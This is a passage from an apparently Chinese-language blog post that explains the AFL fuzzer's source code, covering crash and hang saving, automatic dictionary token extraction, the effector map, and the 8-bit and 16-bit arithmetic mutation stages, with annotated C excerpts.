describe_op(<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/hangs/id_%06llu&quot;</span>, out_dir, unique_hangs);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    unique_hangs++;</span><br><span class="line">    last_hang_time = get_cur_time();  <span class="comment">/* 记录最后超时时间 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> FAULT_CRASH:</span><br><span class="line">    <span class="comment">/* ===== 崩溃处理 ===== */</span></span><br><span class="line"></span><br><span class="line">  keep_as_crash:  <span class="comment">/* 从超时验证跳转来的标签 */</span></span><br><span class="line"></span><br><span class="line">    total_crashes++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 限制保存的崩溃样本数量（默认5000个） */</span></span><br><span class="line">    <span class="keyword">if</span> (unique_crashes &gt;= KEEP_UNIQUE_CRASH)</span><br><span class="line">      <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode) &#123;</span><br><span class="line">      <span class="comment">/* 简化执行路径 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">      simplify_trace((u64 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      simplify_trace((u32 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 检查是否是新的崩溃模式 */</span></span><br><span class="line">      <span class="keyword">if</span> (!has_new_bits(virgin_crash))</span><br><span class="line">        <span class="keyword">return</span> keeping;  <span class="comment">/* 已见过的崩溃模式 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一个崩溃时创建README文件 */</span></span><br><span class="line">    <span class="keyword">if</span> (!unique_crashes)</span><br><span class="line">      write_crash_readme();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 构造崩溃文件名，包含信号值 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/crashes/id:%06llu,sig:%02u,%s&quot;</span>, out_dir,</span><br><span class="line">                      unique_crashes, kill_signal, describe_op(<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/crashes/id_%06llu_%02u&quot;</span>, out_dir, unique_crashes,</span><br><span class="line">                      kill_signal);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    unique_crashes++;</span><br><span class="line">    last_crash_time = get_cur_time();   <span class="comment">/* 记录崩溃时间 */</span></span><br><span class="line">    last_crash_execs = total_execs;     <span class="comment">/* 记录崩溃时的执行次数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> FAULT_ERROR:</span><br><span class="line">    <span class="comment">/* 目标程序无法执行，这是严重错误 */</span></span><br><span class="line">    FATAL(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">/* 其他情况（如FAULT_NONE在非正常模式下） */</span></span><br><span class="line">    <span class="keyword">return</span> keeping;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 保存崩溃或超时样本 ===== </span></span><br><span class="line"><span class="comment">     执行到这里说明需要保存到crashes/或hangs/目录 */</span></span><br><span class="line"></span><br><span class="line">  fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">  ck_write(fd, mem, len, fn);</span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> keeping;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有新的路径则返回，如果有新的路径或者命中次数变化就将其命名并添加到fuzzing队列，如果有新的路径则将其标记有新覆盖。</p><p>然后记录路径校验和并通过<strong>calibrate_case</strong>多次检验记录信息，然后再写入到磁盘当中.然后处理特殊的fault。</p><p>最后返回keeping，只要样例写入磁盘保存到<strong>queue/<strong>目录keeping就为1，这样这个样例会作为种子被后续变异，返回</strong>common_fuzz_stuff</strong>后会使得<em>queued_discovered</em>自增。<br>我们接着返回<strong>fuzz_one</strong>,通过<code>FLIP_BIT(out_buf, stage_cur)</code>翻转回来。</p><p>然后就到了AFL的自动字典提取机制，这里先是只在每个字节的最后一位触发，这部分有个<em>a_collec</em>t数组，数组的作用是记录可能的token，如果是文件末尾，且这次校验和等于上次校验和则直接加入<em>a_collec</em>t，防止遗漏，然后就会检查是否长度合理，如果合理就调用<strong>maybe_add_auto</strong>函数，另一种情况就是检测到可能是token的边界情况，比如说进入token区域或者走出token区域，就是这次校验和和上次不一样的情况，然后就判断长度是否合理再调用<strong>maybe_add_auto</strong>函数来保存。之后就要将len置为0，因为这里可能是这个token的开始，之后要开始记录，这里清理数组，也可能是之前token已经加入，这里也得群里准备之后的token。</p><p>接下来就收集活跃字节，这里是前面文件末尾添加的普遍情况，如果校验和和之前没有变异的情况不一样的话就说明是活跃字节，就加入。<br>同样的后面执行两个连续位翻转，四个连续位翻转</p><p>我们看看这个maybe_add_auto函数具体做了什么</p><h4 id="maybe-add-auto"><a href="#maybe-add-auto" class="headerlink" title="maybe_add_auto"></a>maybe_add_auto</h4><p>这个函数先检查是否所有字节是否全部相同，如果全部相同则不保存，然后根据token的长度不同来考虑是否和已知有趣值来比较包括大端和小端模式，然后和用户字典条目比较，同样不能相同，最后检查a_extras也就是自动字典，如果也没有重复就说明完全没有重复，这样就将其加入到a_extras</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">maybe_add_auto</span><span class="params">(u8 *mem, u32 len)</span> </span>&#123;</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1. 检查是否启用自动字典功能 */</span></span><br><span class="line">  <span class="comment">/* 允许用户指定不使用自动字典 */</span></span><br><span class="line">  <span class="keyword">if</span> (!MAX_AUTO_EXTRAS || !USE_AUTO_EXTRAS)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 2. 跳过所有字节都相同的数据 */</span></span><br><span class="line">  <span class="comment">/* 检查是否为重复字节序列（如: 0x00000000, 0xFFFFFFFF） */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">    <span class="keyword">if</span> (mem[<span class="number">0</span>] ^ mem[i]) <span class="comment">// 如果发现不同字节，跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> (i == len) <span class="comment">// 如果所有字节都相同，则不加入字典</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 3. 拒绝内置的有趣值 */</span></span><br><span class="line">  <span class="comment">/* 检查2字节数据是否为已知的有趣值 */</span></span><br><span class="line">  <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">    i = <span class="keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>; <span class="comment">// 计算interesting_16数组元素个数</span></span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">      <span class="comment">// 检查原值和字节序交换后的值</span></span><br><span class="line">      <span class="keyword">if</span> (*((u16 *)mem) == interesting_16[i] ||</span><br><span class="line">          *((u16 *)mem) == SWAP16(interesting_16[i]))</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果匹配已知有趣值，则不添加</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查4字节数据是否为已知的有趣值 */</span></span><br><span class="line">  <span class="keyword">if</span> (len == <span class="number">4</span>) &#123;</span><br><span class="line">    i = <span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>; <span class="comment">// 计算interesting_32数组元素个数</span></span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">      <span class="comment">// 检查原值和字节序交换后的值</span></span><br><span class="line">      <span class="keyword">if</span> (*((u32 *)mem) == interesting_32[i] ||</span><br><span class="line">          *((u32 *)mem) == SWAP32(interesting_32[i]))</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果匹配已知有趣值，则不添加</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 4. 检查是否与现有的用户字典条目重复 */</span></span><br><span class="line">  <span class="comment">/* 拒绝与现有extras匹配的数据。进行大小写不敏感匹配。</span></span><br><span class="line"><span class="comment">     利用extras[]按大小排序的特性进行优化 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; extras_cnt; i++)</span><br><span class="line">    <span class="keyword">if</span> (extras[i].len &gt;= len) <span class="comment">// 找到第一个长度&gt;=len的条目</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 在相同长度的条目中查找重复 */</span></span><br><span class="line">  <span class="keyword">for</span> (; i &lt; extras_cnt &amp;&amp; extras[i].len == len; i++)</span><br><span class="line">    <span class="keyword">if</span> (!memcmp_nocase(extras[i].data, mem, len)) <span class="comment">// 大小写不敏感比较</span></span><br><span class="line">      <span class="keyword">return</span>;                                     <span class="comment">// 如果找到重复，则不添加</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 5. 检查自动字典数组中的重复项 */</span></span><br><span class="line">  <span class="comment">/* 最后检查a_extras[]中的匹配项。这里没有特定的排序保证 */</span></span><br><span class="line">  auto_changed = <span class="number">1</span>; <span class="comment">// 标记自动字典已更改</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a_extras_cnt; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_extras[i].len == len &amp;&amp; !memcmp_nocase(a_extras[i].data, mem, len)) &#123;</span><br><span class="line">      <span class="comment">// 如果找到相同条目，增加其命中计数</span></span><br><span class="line">      a_extras[i].hit_cnt++;</span><br><span class="line">      <span class="keyword">goto</span> sort_a_extras; <span class="comment">// 跳转到排序部分</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 6. 添加新条目 */</span></span><br><span class="line">  <span class="comment">/* 此时看起来我们处理的是一个新条目。</span></span><br><span class="line"><span class="comment">     如果有空间就追加它，否则从列表下半部分随机驱逐某个条目 */</span></span><br><span class="line">  <span class="keyword">if</span> (a_extras_cnt &lt; MAX_AUTO_EXTRAS) &#123;</span><br><span class="line">    <span class="comment">// 还有空间，直接添加新条目</span></span><br><span class="line">    a_extras = ck_realloc_block(a_extras,</span><br><span class="line">                                (a_extras_cnt + <span class="number">1</span>) * <span class="keyword">sizeof</span>(struct extra_data));</span><br><span class="line">    a_extras[a_extras_cnt].data = ck_memdup(mem, len); <span class="comment">// 复制数据</span></span><br><span class="line">    a_extras[a_extras_cnt].len = len;</span><br><span class="line">    a_extras_cnt++;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 空间已满，从下半部分随机选择一个条目替换</span></span><br><span class="line">    i = MAX_AUTO_EXTRAS / <span class="number">2</span> + UR((MAX_AUTO_EXTRAS + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">    ck_free(a_extras[i].data);              <span class="comment">// 释放旧数据</span></span><br><span class="line">    a_extras[i].data = ck_memdup(mem, len); <span class="comment">// 设置新数据</span></span><br><span class="line">    a_extras[i].len = len;</span><br><span class="line">    a_extras[i].hit_cnt = <span class="number">0</span>; <span class="comment">// 重置命中计数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">sort_a_extras:</span><br><span class="line">  <span class="comment">/* 7. 对自动字典进行排序优化 */</span></span><br><span class="line">  <span class="comment">/* 首先，按使用计数降序排列所有自动extras */</span></span><br><span class="line">  qsort(a_extras, a_extras_cnt, <span class="keyword">sizeof</span>(struct extra_data),</span><br><span class="line">        compare_extras_use_d);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 然后，将前USE_AUTO_EXTRAS个条目按大小排序 */</span></span><br><span class="line">  <span class="comment">/* 这样可以优化查找和使用效率 */</span></span><br><span class="line">  qsort(a_extras, MIN(USE_AUTO_EXTRAS, a_extras_cnt), <span class="keyword">sizeof</span>(struct extra_data),</span><br><span class="line">        compare_extras_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此之后我们可以看到一个Effector Map</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ===== Effector Map（效应图）相关宏定义 =====</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   效应图用于标记哪些字节对程序执行路径有影响</span></span><br><span class="line"><span class="comment">   为了节省内存，使用了缩放因子 EFF_MAP_SCALE2（默认为3）</span></span><br><span class="line"><span class="comment">   即每8个字节共享效应图中的一个条目</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将文件偏移转换为效应图索引</span></span><br><span class="line"><span class="comment">   例：EFF_MAP_SCALE2=3时，偏移0-7映射到索引0，8-15映射到索引1 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_APOS(_p) ((_p) &gt;&gt; EFF_MAP_SCALE2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算偏移在效应图条目中的余数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_REM(_x) ((_x) &amp; ((1 &lt;&lt; EFF_MAP_SCALE2) - 1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算存储长度为_l的数据需要的效应图条目数</span></span><br><span class="line"><span class="comment">   加上 !!EFF_REM(_l) 是为了处理不能整除的情况（向上取整） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_ALEN(_l) (EFF_APOS(_l) + !!EFF_REM(_l))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算从位置_p开始、长度为_l的序列跨越的效应图条目数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1)</span></span><br></pre></td></tr></table></figure><p>首先是<code>EFF_APOS(_p)</code>这个比较好理解，就是对_p进行除以8，</p><p><code>EFF_REM(_x)</code>是计算偏移在效应图条目中对*(1 &lt;&lt; EFF_MAP_SCALE2)*取模，</p><p><code>EFF_ALEN(_l)</code>是_l除以8然后向上取整，</p><p><code>!!EFF_REM(_l)</code>可以详细聊聊，这里!!是一个双重取反实际上是<strong>将任意值转换为标准布尔值（0或1）</strong>，如果为0就是0，否则就是1。</p><p><code>EFF_SPAN_ALEN(_p, _l) </code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EFF_SPAN_ALEN(_p, _l) = EFF_APOS((_p) + (_l) - <span class="number">1</span>) - EFF_APOS(_p) + <span class="number">1</span></span><br><span class="line">                         \_____________________/   \__________/   \_/</span><br><span class="line">                                   |                     |         |</span><br><span class="line">                            结束位置的索引        开始位置的索引    +<span class="number">1</span>修正</span><br></pre></td></tr></table></figure><p>**<code>EFF_APOS(_p)</code>**：起始偏移 <code>_p</code> 所在的条目索引</p><p>**<code>EFF_APOS((_p) + (_l) - 1)</code>**：最后一个字节所在的条目索引</p><ul><li><code>(_p) + (_l) - 1</code> 是最后一个字节的偏移</li></ul><p><strong>索引差 + 1</strong>：得到跨越的条目数量</p><p>之后是初始化效应图 ，这里有上面的解释就看起来很清楚了。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eff_map = ck_alloc(EFF_ALEN(len)); <span class="comment">/* 分配效应图内存 */</span></span><br><span class="line">eff_map[<span class="number">0</span>] = <span class="number">1</span>;                    <span class="comment">/* 第一个条目总是标记为有效 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标记最后一个条目（如果不是第一个） */</span></span><br><span class="line"><span class="keyword">if</span> (EFF_APOS(len - <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">  eff_map[EFF_APOS(len - <span class="number">1</span>)] = <span class="number">1</span>;</span><br><span class="line">  eff_cnt++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是大于等于一个字节的位翻转，而且我们发现只有在单字节翻转的时候记录了eff_map，这是有可能错过一些可能的样例，但是这应该也是一种取舍了，这样性能会好一些。</p><p>后面单字节和多字节的翻转都是一样的，重点是eff_map的使用，在单字节翻转的时候做记录，如果8个字节其中一个有效就设置为1，然后会在后面2，4，8字节使用，如果探测的多个字节都无效的话就跳过，这里在记录的时候要注意如果大于90%都有效就不使用，因为影响效率。</p><h3 id="算数运算阶段"><a href="#算数运算阶段" class="headerlink" title="算数运算阶段"></a>算数运算阶段</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ************************* 第一阶段：8位算术运算 *************************</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;arith 8/8&quot;</span>; <span class="comment">// 阶段名称：8位算术运算（显示在UI中）</span></span><br><span class="line">  stage_short = <span class="string">&quot;arith8&quot;</span>;   <span class="comment">// 阶段简称（用于内部标识）</span></span><br><span class="line">  stage_cur = <span class="number">0</span>;            <span class="comment">// 当前执行进度（从0开始）</span></span><br><span class="line">  stage_max =</span><br><span class="line">      <span class="number">2</span> * len * ARITH_MAX; <span class="comment">// 本阶段总执行次数</span></span><br><span class="line">                           <span class="comment">// 2: 加法和减法两种操作</span></span><br><span class="line">                           <span class="comment">// len: 输入文件字节数</span></span><br><span class="line">                           <span class="comment">// ARITH_MAX: 每种操作的最大尝试值（通常为35）</span></span><br><span class="line"></span><br><span class="line">  stage_val_type = STAGE_VAL_LE; <span class="comment">// 值类型设为小端序（Little Endian）</span></span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt; <span class="comment">// 保存阶段开始前的路径发现数</span></span><br><span class="line">                              <span class="comment">// 用于统计本阶段的成效</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历输入文件的每个字节 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8 orig = out_buf[i]; <span class="comment">// 保存当前字节的原始值</span></span><br><span class="line">                          <span class="comment">// u8表示无符号8位整数（0-255）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 效应图（Effect Map）优化：跳过无效字节</span></span><br><span class="line"><span class="comment">     * eff_map记录了哪些字节的修改会产生&quot;有趣&quot;的结果</span></span><br><span class="line"><span class="comment">     * EFF_APOS宏计算字节i在效应图中的位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)]) &#123;</span><br><span class="line">      stage_max -= <span class="number">2</span> * ARITH_MAX; <span class="comment">// 更新总计数（减去跳过的次数）</span></span><br><span class="line">      <span class="keyword">continue</span>;                   <span class="comment">// 跳到下一个字节</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i; <span class="comment">// 记录当前处理的字节位置（UI显示用）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 对当前字节尝试ARITH_MAX种不同的算术值 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* --- 加法运算测试 --- */</span></span><br><span class="line">      u8 r = orig ^ (orig + j); <span class="comment">// 计算XOR差异</span></span><br><span class="line">                                <span class="comment">// 用于判断变化是否等同于简单位翻转</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 智能去重：避免重复位翻转阶段已经测试过的情况</span></span><br><span class="line"><span class="comment">       * 例如：0xFF + 1 = 0x00 等同于翻转所有位</span></span><br><span class="line"><span class="comment">       * could_be_bitflip()函数检查这种等价性</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!could_be_bitflip(r)) &#123;</span><br><span class="line">        stage_cur_val = j;     <span class="comment">// 记录当前测试值（UI显示用）</span></span><br><span class="line">        out_buf[i] = orig + j; <span class="comment">// 执行加法变异（可能溢出）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* common_fuzz_stuff: 核心测试函数</span></span><br><span class="line"><span class="comment">         * - 运行目标程序</span></span><br><span class="line"><span class="comment">         * - 检查是否发现新路径或崩溃</span></span><br><span class="line"><span class="comment">         * - 返回非0表示需要放弃当前种子</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry; <span class="comment">// 立即退出所有循环</span></span><br><span class="line">        stage_cur++;          <span class="comment">// 更新进度计数</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--; <span class="comment">// 跳过的测试从总数中减去</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* --- 减法运算测试 --- */</span></span><br><span class="line">      r = orig ^ (orig - j); <span class="comment">// 计算XOR差异</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!could_be_bitflip(r)) &#123;</span><br><span class="line">        stage_cur_val = -j;    <span class="comment">// 负值表示减法操作</span></span><br><span class="line">        out_buf[i] = orig - j; <span class="comment">// 执行减法变异（可能下溢）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      out_buf[i] = orig; <span class="comment">// 重要：恢复原始值</span></span><br><span class="line">                         <span class="comment">// 确保每次变异都是独立的</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 阶段统计 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;             <span class="comment">// 获取新的总发现数</span></span><br><span class="line">  stage_finds[STAGE_ARITH8] += new_hit_cnt - orig_hit_cnt; <span class="comment">// 记录本阶段发现</span></span><br><span class="line">  stage_cycles[STAGE_ARITH8] += stage_max;                 <span class="comment">// 累计执行次数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ************************* 第二阶段：16位算术运算 *************************</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 长度检查：至少需要2个字节才能进行16位操作 */</span></span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_arith; <span class="comment">// 跳过剩余的算术运算阶段</span></span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;arith 16/8&quot;</span>; <span class="comment">// 16位算术，但增量仍是8位</span></span><br><span class="line">  stage_short = <span class="string">&quot;arith16&quot;</span>;</span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  stage_max = <span class="number">4</span> * (len - <span class="number">1</span>) * ARITH_MAX; <span class="comment">// 4种操作：小端加减、大端加减</span></span><br><span class="line">                                         <span class="comment">// len-1: 防止越界</span></span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历每个可能的16位字位置 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u16 orig = *(u16 *)(out_buf + i); <span class="comment">// 读取16位值（可能未对齐）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查效应图：两个字节都无效才跳过 */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)]) &#123;</span><br><span class="line">      stage_max -= <span class="number">4</span> * ARITH_MAX;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 预计算四种操作的XOR结果，用于去重检查 */</span></span><br><span class="line">      u16 r1 = orig ^ (orig + j),               <span class="comment">// 小端加法</span></span><br><span class="line">          r2 = orig ^ (orig - j),               <span class="comment">// 小端减法</span></span><br><span class="line">          r3 = orig ^ SWAP16(SWAP16(orig) + j), <span class="comment">// 大端加法</span></span><br><span class="line">          r4 = orig ^ SWAP16(SWAP16(orig) - j); <span class="comment">// 大端减法</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 小端（Little Endian）处理 === */</span></span><br><span class="line">      stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 小端加法</span></span><br><span class="line"><span class="comment">       * 关键优化：只有当加法会产生进位（影响高字节）时才执行</span></span><br><span class="line"><span class="comment">       * (orig &amp; 0xff) + j &gt; 0xff 检查低字节是否会溢出</span></span><br><span class="line"><span class="comment">       * 这避免了只影响单个字节的操作（8位阶段已测试过）</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> ((orig &amp; <span class="number">0xff</span>) + j &gt; <span class="number">0xff</span> &amp;&amp; !could_be_bitflip(r1)) &#123;</span><br><span class="line">        stage_cur_val = j;</span><br><span class="line">        *(u16 *)(out_buf + i) = orig + j; <span class="comment">// 写入16位结果</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 小端减法</span></span><br><span class="line"><span class="comment">       * (orig &amp; 0xff) &lt; j 检查低字节是否会下溢（借位）</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> ((orig &amp; <span class="number">0xff</span>) &lt; j &amp;&amp; !could_be_bitflip(r2)) &#123;</span><br><span class="line">        stage_cur_val = -j;</span><br><span class="line">        *(u16 *)(out_buf + i) = orig - j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 大端（Big Endian）处理 === */</span></span><br><span class="line">      stage_val_type = STAGE_VAL_BE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 大端加法</span></span><br><span class="line"><span class="comment">       * SWAP16宏：交换16位值的字节序</span></span><br><span class="line"><span class="comment">       * (orig &gt;&gt; 8) + j &gt; 0xff 检查高字节（大端的第一个字节）是否溢出</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> ((orig &gt;&gt; <span class="number">8</span>) + j &gt; <span class="number">0xff</span> &amp;&amp; !could_be_bitflip(r3)) &#123;</span><br><span class="line">        stage_cur_val = j;</span><br><span class="line">        *(u16 *)(out_buf + i) = SWAP16(SWAP16(orig) + j);</span><br><span class="line">        <span class="comment">// 流程：原值 -&gt; 转大端 -&gt; 加法 -&gt; 转回小端存储</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 大端减法 */</span></span><br><span class="line">      <span class="keyword">if</span> ((orig &gt;&gt; <span class="number">8</span>) &lt; j &amp;&amp; !could_be_bitflip(r4)) &#123;</span><br><span class="line">        stage_cur_val = -j;</span><br><span class="line">        *(u16 *)(out_buf + i) = SWAP16(SWAP16(orig) - j);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      